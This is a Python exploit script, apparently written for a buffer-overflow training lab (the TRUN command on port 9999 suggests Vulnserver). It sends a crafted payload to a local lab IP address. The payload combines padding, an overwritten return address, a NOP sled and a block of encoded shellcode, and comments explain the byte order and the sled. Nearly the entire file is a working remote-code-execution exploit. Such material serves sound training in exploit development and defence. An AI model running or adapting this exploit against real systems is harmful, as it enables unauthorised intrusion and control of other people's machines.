import socket
import sys

#625011af (We write it in reverse because we are in x86 format)

overflow_payloads = ("\xd9\xce\xd9\x74\x24\xf4\x5b\xb8\x8b\xa8\x98\x06\x29\xc9"
"\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x60\x54\x7a\xf3\x8a"
"\x4d\xf9\xfc\x72\x8e\x9e\x75\x97\xbf\x9e\xe2\xdc\x90\x2e"
"\x60\xb0\x1c\xc4\x24\x20\x96\xa8\xe0\x47\x1f\x06\xd7\x66"
"\xa0\x3b\x2b\xe9\x22\x46\x78\xc9\x1b\x89\x8d\x08\x5b\xf4"
"\x7c\x58\x34\x72\xd2\x4c\x31\xce\xef\xe7\x09\xde\x77\x14"
"\xd9\xe1\x56\x8b\x51\xb8\x78\x2a\xb5\xb0\x30\x34\xda\xfd"
"\x8b\xcf\x28\x89\x0d\x19\x61\x72\xa1\x64\x4d\x81\xbb\xa1"
"\x6a\x7a\xce\xdb\x88\x07\xc9\x18\xf2\xd3\x5c\xba\x54\x97"
"\xc7\x66\x64\x74\x91\xed\x6a\x31\xd5\xa9\x6e\xc4\x3a\xc2"
"\x8b\x4d\xbd\x04\x1a\x15\x9a\x80\x46\xcd\x83\x91\x22\xa0"
"\xbc\xc1\x8c\x1d\x19\x8a\x21\x49\x10\xd1\x2d\xbe\x19\xe9"
"\xad\xa8\x2a\x9a\x9f\x77\x81\x34\xac\xf0\x0f\xc3\xd3\x2a"
"\xf7\x5b\x2a\xd5\x08\x72\xe9\x81\x58\xec\xd8\xa9\x32\xec"
"\xe5\x7f\x94\xbc\x49\xd0\x55\x6c\x2a\x80\x3d\x66\xa5\xff"
"\x5e\x89\x6f\x68\xf4\x70\xf8\x9d\x09\x78\xf2\xc9\x0b\x7c"
"\x1c\x6b\x85\x9a\x4a\x7b\xc3\x35\xe3\xe2\x4e\xcd\x92\xeb"
"\x44\xa8\x95\x60\x6b\x4d\x5b\x81\x06\x5d\x0c\x61\x5d\x3f"
"\x9b\x7e\x4b\x57\x47\xec\x10\xa7\x0e\x0d\x8f\xf0\x47\xe3"
"\xc6\x94\x75\x5a\x71\x8a\x87\x3a\xba\x0e\x5c\xff\x45\x8f"
"\x11\xbb\x61\x9f\xef\x44\x2e\xcb\xbf\x12\xf8\xa5\x79\xcd"
"\x4a\x1f\xd0\xa2\x04\xf7\xa5\x88\x96\x81\xa9\xc4\x60\x6d"
"\x1b\xb1\x34\x92\x94\x55\xb1\xeb\xc8\xc5\x3e\x26\x49\xe5"
"\xdc\xe2\xa4\x8e\x78\x67\x05\xd3\x7a\x52\x4a\xea\xf8\x56"
"\x33\x09\xe0\x13\x36\x55\xa6\xc8\x4a\xc6\x43\xee\xf9\xe7"
"\x41")

stringToSend = "TRUN /.:/" + "X" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow_payloads

try:
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect(("10.0.2.15", 9999))
    bytes = stringToSend.encode(encoding="Latin1")
    my_socket.send(bytes)
    my_socket.close()

except Exception as e:
    print(e)
    sys.exit()


# The size of the attack you are performing on the target can sometimes make a difference, and increasing it can lead to issues. 
# The solution is to insert a NOP (No Operation) instruction: "\x90" * 32. However, it's generally effective to space out the payload a bit. 
# There is no strict rule for this; you can experiment with 32-6-1 or other variations depending on your limits.
